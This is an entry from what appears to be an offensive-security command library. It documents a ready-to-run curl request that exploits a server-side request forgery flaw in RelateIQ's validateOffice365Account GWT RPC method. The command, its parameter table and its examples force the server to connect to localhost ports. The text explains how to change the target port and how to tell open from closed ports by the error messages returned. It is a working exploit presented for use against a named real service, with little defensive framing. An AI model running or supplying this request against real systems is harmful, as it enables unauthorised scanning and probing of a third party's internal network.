---
id: cmd-relateiq-ssrf-post
data: >-
  curl -X POST https://app.relateiq.com/app/GWT.rpc -H "Content-Type:
  text/x-gwt-rpc; charset=utf-8" -H "X-GWT-Permutation:
  95882AF82F06F7F3497A1C7BDD950153" -H "X-GWT-Module-Base:
  https://app.relateiq.com/app/" -d
  '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
tags:
  - ssrf
  - http
  - gwt
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.206Z'
verified: false
validated: true
submitted: true
---
# relateiq-ssrf-post

## Command

```bash
curl -X POST https://app.relateiq.com/app/GWT.rpc \
  -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
  -H "X-GWT-Permutation: 95882AF82F06F7F3497A1C7BDD950153" \
  -H "X-GWT-Module-Base: https://app.relateiq.com/app/" \
  -d '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
```

## Description

This curl command sends a crafted GWT RPC POST request to RelateIQ's validateOffice365Account method, exploiting SSRF by specifying an arbitrary URL (e.g., localhost port 1). Use it during registration's custom server validation to force server-side connections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: ..."` | Sets GWT RPC content type | Yes |
| `-H "X-GWT-Permutation: ..."` | GWT permutation hash for serialization | Yes |
| `-H "X-GWT-Module-Base: ..."` | Module base URL | Yes |
| `-d '...' ` | Payload with email, password, and target URL | Yes |

In the payload, modify the URL after the password (e.g., |https://127.0.0.1:80|) to scan different ports.

## Examples

### Basic Usage

```bash
curl -X POST https://app.relateiq.com/app/GWT.rpc -H "Content-Type: text/x-gwt-rpc; charset=utf-8" -H "X-GWT-Permutation: 95882AF82F06F7F3497A1C7BDD950153" -H "X-GWT-Module-Base: https://app.relateiq.com/app/" -d '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
```

### Advanced Usage

```bash
# Scan port 80
curl ... -d '...|123|https://127.0.0.1:80|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
```

## Expected Output

For closed ports: HTTP response with 'Unable to connect to the remote server'. For open ports: HTTP 504 Gateway Timeout or 'The underlying connection was closed' error, indicating successful connection.

## Related

- [[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]
